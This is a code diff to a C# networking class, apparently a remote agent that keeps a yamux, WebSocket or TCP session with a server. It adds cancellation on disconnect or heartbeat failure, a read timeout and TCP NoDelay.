@@ -442,6 +442,7 @@ public class RosemaryAgent {
         } catch (Exception ex) {
             if (!_cts.IsCancellationRequested) Log("[rm] yamux read error: " + ex.GetType().Name + ": " + ex.Message);
         }
+        _cts.Cancel();
         _incoming.CompleteAdding();
     }
 
@@ -705,7 +706,10 @@ public class RosemaryAgent {
         Task.Run(async () => {
             while (!_cts.IsCancellationRequested) {
                 try { await Task.Delay(10000, _cts.Token); } catch { break; }
-                if (_agentId.Length > 0) try { await SendMsg(write, "heartbeat", "{}", _agentId); } catch { break; }
+                if (_agentId.Length > 0) {
+                    try { await SendMsg(write, "heartbeat", "{}", _agentId); }
+                    catch { _cts.Cancel(); break; }
+                }
             }
         });
         while (!_cts.IsCancellationRequested) {
@@ -742,7 +746,10 @@ public class RosemaryAgent {
 
     async Task<byte[]> WsReadMsg(ClientWebSocket ws) {
         var ms = new MemoryStream(); var buf = new byte[65536]; WebSocketReceiveResult r;
-        do { r = await ws.ReceiveAsync(new ArraySegment<byte>(buf), _cts.Token); if (r.MessageType == WebSocketMessageType.Close) return null; ms.Write(buf, 0, r.Count); } while (!r.EndOfMessage);
+        using (var readCts = CancellationTokenSource.CreateLinkedTokenSource(_cts.Token)) {
+            readCts.CancelAfter(120000);
+            do { r = await ws.ReceiveAsync(new ArraySegment<byte>(buf), readCts.Token); if (r.MessageType == WebSocketMessageType.Close) return null; ms.Write(buf, 0, r.Count); } while (!r.EndOfMessage);
+        }
         return ms.ToArray();
     }
 
@@ -812,6 +819,7 @@ public class RosemaryAgent {
                     Log("[rm] server connected from " + client.Client.RemoteEndPoint);
                     try {
                         client.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
+                        client.Client.SetSocketOption(SocketOptionLevel.Tcp, SocketOptionName.NoDelay, true);
                         var kav = new byte[12];
                         BitConverter.GetBytes(1).CopyTo(kav, 0);
                         BitConverter.GetBytes(15000).CopyTo(kav, 4);
@@ -845,6 +853,7 @@ public class RosemaryAgent {
             Log("[rm] running session...");
             await RunSession(TcpReadN, TcpWrite);
         } catch (Exception ex) { Log("[rm] " + ex.GetType().Name + ": " + ex.Message); }
+        _cts.Cancel();
         client.Close();
     }
 }
